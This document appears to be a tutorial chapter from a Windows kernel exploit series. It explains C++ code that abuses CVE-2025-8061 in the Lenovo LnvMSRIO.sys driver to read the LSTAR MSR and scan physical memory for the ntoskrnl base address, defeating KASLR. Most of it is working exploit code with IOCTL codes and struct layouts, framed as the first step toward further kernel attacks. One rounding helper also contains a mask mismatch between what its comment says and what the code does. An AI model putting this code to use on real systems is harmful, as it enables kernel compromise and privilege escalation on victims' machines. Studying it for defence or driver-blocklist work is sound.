# 01 — KASLR Defeat (MSR LSTAR + Physical RAM Scan)

**File:** `01_kaslr_defeat.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** MSR read + Physical memory read  
**Output:** VA base of ntoskrnl.exe on the running machine

---

## Objective

KASLR (Kernel Address Space Layout Randomization) randomizes the kernel load address on every boot. Without the base address of ntoskrnl.exe, we cannot compute the address of any symbol (e.g., PsInitialSystemProcess, PspCreateProcessNotifyRoutineArray, etc.). This is the **mandatory first step** in any kernel exploit.

---

## Background Theory

### LSTAR MSR (0xC0000082)

On x64, when user-mode code executes the `SYSCALL` instruction, the CPU automatically jumps to the address stored in MSR `IA32_LSTAR` (0xC0000082). Windows places `KiSystemCall64` there — this is the entry point for all kernel syscalls. Because `KiSystemCall64` resides inside ntoskrnl.exe, reading LSTAR gives us **an arbitrary VA somewhere inside ntoskrnl**.

### Why scan physical memory instead of using NtQuerySystemInformation?

`NtQuerySystemInformation(SystemModuleInformation)` also returns the ntoskrnl base — but this physical scan technique **does not use any syscall that depends on privilege level**. It uses the driver's IOCTL, bypassing that check entirely. This is a demonstration of how powerful the primitive is.

### ntoskrnl.exe is always 2MB-aligned

Windows maps ntoskrnl using large pages (2MB = 0x200000). This guarantees that the physical address of ntoskrnl is **always a multiple of 0x200000**. This property allows us to scan physical RAM in 2MB steps instead of byte by byte.

---

## IOCTL Layout of LnvMSRIO.sys

```
MSR read  (0x9c402084):
  Input:  { DWORD Register }          (4 bytes)
  Output: { UINT64 Value }            (8 bytes)

Phys read (0x9c406104):
  Input:  { UINT64 PA; DWORD AccessSize; DWORD Count }
          AccessSize: 1=BYTE, 2=WORD, 8=QWORD
          Total bytes read = AccessSize × Count (max 4096)
  Output: raw bytes
```

---

## Line-by-Line Code Explanation

### Input/Output Structs

```cpp
#pragma pack(push, 1)
struct MsrReadIn  { DWORD Register; };
struct MsrReadOut { UINT64 Value;   };
#pragma pack(pop)
```

`#pragma pack(push, 1)` — disables compiler padding. The driver expects a byte-exact layout; any padding would shift field offsets → IOCTL failure.

```cpp
struct PhysReadIn {
    UINT64 PhysAddr;    // physical address to read
    DWORD  AccessSize;  // size of each element: 1, 2, or 8
    DWORD  Count;       // number of elements → total = AccessSize * Count bytes
};
```

The driver uses `MmMapIoSpace(PhysAddr, AccessSize*Count)` to map physical memory into a kernel VA, then reads from it.

### ReadMSR()

```cpp
static bool ReadMSR(DWORD msr, uint64_t *out)
{
    MsrReadIn  in  = { msr };           // only need to send the MSR register number
    MsrReadOut res = {};
    DWORD      got = 0;

    if (!DeviceIoControl(g_dev, IOCTL_MSR_READ,
                         &in, sizeof(in), &res, sizeof(res), &got, nullptr)
        || got < sizeof(res)) {
        printf("[-] ReadMSR(0x%08X): error %lu\n", msr, GetLastError());
        return false;
    }
    *out = res.Value;
    return true;
}
```

The driver executes the `RDMSR` instruction in ring 0 (only kernel code may read MSRs directly). The output is the 64-bit value of the requested MSR.

### PhysRead() and PhysReadU64()

```cpp
static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;   // driver limits 4096 bytes per IOCTL
    PhysReadIn in  = { pa, 1, len };        // AccessSize=1 (byte), Count=len
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           buf,  len,
                           &got, nullptr) && (got == len);
}
```

With `AccessSize=1, Count=len` → reads `len` consecutive bytes from physical address `pa`. The 4096-byte limit exists because the driver uses `MmMapIoSpace` and does not support mapping more than that in a single call.

```cpp
static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in  = { pa, 8, 1 };          // AccessSize=8 (QWORD), Count=1
    DWORD      got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in,  sizeof(in),
                           out,  sizeof(*out),
                           &got, nullptr) && (got == 8);
}
```

Reads exactly 8 bytes (1 QWORD) from a physical address. Used for reading pointers and page table entries.

### PE Header Helpers

```cpp
static bool IsValidPE64(const uint8_t *p, size_t sz)
{
    if (sz < 0x100)                          return false;
    if (p[0] != 'M' || p[1] != 'Z')         return false;   // check MZ signature

    LONG lfanew = *(const LONG *)(p + 0x3C);                 // offset of PE header
    if (lfanew < 0 || (size_t)lfanew + 0x100 > sz) return false;

    if (*(const DWORD *)(p + lfanew) != 0x00004550u) return false; // "PE\0\0"
    if (*(const WORD  *)(p + lfanew + 4) != 0x8664)  return false; // Machine = AMD64
    if (*(const WORD  *)(p + lfanew + 0x18) != 0x020B) return false; // Magic = PE32+
    return true;
}
```

PE header layout (from offset 0):
- `0x00`: `MZ` — DOS signature
- `0x3C`: `e_lfanew` — offset to PE header
- `e_lfanew + 0x00`: `PE\0\0` — PE signature
- `e_lfanew + 0x04`: `Machine` = `0x8664` = AMD64
- `e_lfanew + 0x18`: `Magic` = `0x020B` = PE32+ (64-bit)

```cpp
static uint64_t PE64_ImageBase(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint64_t *)(p + lfanew + 0x30);
    // e_lfanew + 0x18 (OptionalHeader start) + 0x18 (ImageBase offset in OptHdr) = +0x30
}

static uint32_t PE64_SizeOfImage(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x50);
    // OptionalHeader + 0x38 = SizeOfImage
}

static uint32_t PE64_ExportDirRVA(const uint8_t *p)
{
    LONG lfanew = *(const LONG *)(p + 0x3C);
    return *(const uint32_t *)(p + lfanew + 0x88);
    // OptionalHeader + 0x70 = DataDirectory[0].VirtualAddress (Export)
}
```

These offsets are fixed in the PE spec for PE32+ (64-bit binaries).

### PhysRamTop()

```cpp
static uint64_t PhysRamTop()
{
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    // Add 512MB headroom (some machines have physical RAM holes)
    uint64_t top = ms.ullTotalPhys + (512ULL << 20);
    // Round up to the nearest 2MB multiple (2MB = 0x200000 = scan step)
    return (top + 0x1FFFFULL) & ~0x1FFFFFULL;
}
```

We scan up to `total_physical_ram + 512MB` to cover systems with memory holes in between. Round up to 2MB because the scan step is 2MB.

### Phase 1: Read LSTAR

```cpp
uint64_t lstar = 0;
if (!ReadMSR(0xC0000082, &lstar) || !lstar) {
    printf("[-] Failed to read LSTAR\n");
    CloseHandle(g_dev); return 1;
}
// Sanity check: must be a kernel VA (> 0xFFFF000000000000)
if (lstar < 0xFFFF000000000000ULL) {
    printf("[-] LSTAR value looks wrong (user-space VA?)\n");
    CloseHandle(g_dev); return 1;
}
```

`KiSystemCall64` always has a canonical kernel VA on Windows x64 (high half, bit 63 = 1).

### Phase 2: Scan Physical RAM

```cpp
for (uint64_t pa = 0x100000ULL; pa < ram_top; pa += 0x200000ULL) {

    // Skip PCI/MMIO hole: 0xC0000000 - 0xFFFFFFFF
    // This is not RAM — the driver will BSOD if it tries to read this region
    if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;

    // Read the first 4KB of this 2MB page
    if (!PhysRead(pa, page, sizeof(page))) continue;

    // Quick MZ check to save time
    if (page[0] != 'M' || page[1] != 'Z') continue;

    if (!IsValidPE64(page, sizeof(page))) continue;

    uint64_t img_base = PE64_ImageBase(page);
    uint32_t img_size = PE64_SizeOfImage(page);

    // Must be kernel VA space
    if (img_base < 0xFFFF800000000000ULL) continue;

    // KiSystemCall64 must lie within [ImageBase, ImageBase + SizeOfImage)
    if (lstar < img_base || lstar >= (uint64_t)img_base + img_size) continue;
```

Logic: for every 2MB boundary in physical RAM, read the first 4KB and check:
1. Is there a valid MZ + PE64 header?
2. Is ImageBase in kernel VA space?
3. Does `KiSystemCall64` (= LSTAR) fall within `[ImageBase, ImageBase+SizeOfImage)`?

If condition 3 is satisfied → this is almost certainly ntoskrnl.

```cpp
    // Verify via Export Directory → read the module name
    uint32_t exp_rva = PE64_ExportDirRVA(page);
    char mod_name[32] = "<unknown>";

    if (exp_rva && exp_rva + 0x20 < img_size) {
        uint8_t expdir[20] = {};
        if (PhysRead(pa + exp_rva, expdir, sizeof(expdir))) {
            uint32_t name_rva = *(uint32_t *)(expdir + 0x0C);
            // IMAGE_EXPORT_DIRECTORY.Name (+0x0C) = RVA of the module name string
            if (name_rva && name_rva + sizeof(mod_name) < img_size)
                PhysRead(pa + name_rva, mod_name, sizeof(mod_name) - 1);
        }
    }

    // Accept "ntoskrnl.exe", "ntkrnlmp.exe" (multiprocessor variant)
    if (_stricmp(mod_name, "ntoskrnl.exe") == 0 ||
        _stricmp(mod_name, "ntkrnlmp.exe") == 0 ||
        _stricmp(mod_name, "ntkrpamp.exe") == 0) {
        found_pa   = pa;
        found_base = img_base;
        found_size = img_size;
        break;
    }
```

`IMAGE_EXPORT_DIRECTORY` layout:
- `+0x00` Characteristics
- `+0x04` TimeDateStamp  
- `+0x08` MajorVersion, MinorVersion
- `+0x0C` **Name** (RVA of the module name string)
- `+0x10` Base
- `+0x14` NumberOfFunctions
- `+0x18` NumberOfNames
- `+0x1C` AddressOfFunctions
- `+0x20` AddressOfNames
- `+0x24` AddressOfNameOrdinals

### Output

```cpp
uint64_t lstar_offset = lstar - found_base;  // offset of KiSystemCall64 within ntoskrnl

printf(" ntoskrnl  VA base   : 0x%016llX\n", found_base);
printf(" ntoskrnl  PA base   : 0x%016llX\n", found_pa);
printf(" KiSystemCall64 +off : +0x%llX\n",   lstar_offset);
```

**`found_base` is the result required** for every subsequent technique: to compute the address of any ntoskrnl export, use `found_base + export_RVA`.

---

## Bonus: Reading the KiSystemCall64 Prologue

```cpp
uint64_t ki_pa = found_pa + lstar_offset;
// = physical address of ntoskrnl base + offset of KiSystemCall64
// Because ntoskrnl is mapped contiguously from found_pa, VA offset == PA offset

uint8_t prologue[16] = {};
if (PhysRead(ki_pa, prologue, sizeof(prologue))) {
    printf("[+] KiSystemCall64 @ PA 0x%016llX:\n    ", ki_pa);
    for (int i = 0; i < 16; i++) printf("%02X ", prologue[i]);
}
```

This is **proof** that we can read kernel code directly from physical memory.

---

## Stability

| Issue | Explanation |
|-------|-------------|
| PatchGuard | No risk — read-only, no writes |
| HVCI | No impact — only reads physical memory |
| Race condition | None — ntoskrnl does not relocate after boot |
| BSOD risk | Low — only risk is reading a PCI MMIO region (already skipped) |

---

## Flow Summary

```
ReadMSR(LSTAR) → KiSystemCall64 VA
    ↓
Scan PA from 0x100000, step 2MB
    ↓
For each PA: read 4KB
    ↓ MZ? PE64? ImageBase ∈ kernel space?
    ↓ LSTAR ∈ [ImageBase, ImageBase+Size)?
    ↓ ExportDir.Name == "ntoskrnl.exe"?
    ↓
→ found_base (ntoskrnl VA), found_pa (ntoskrnl PA)
```
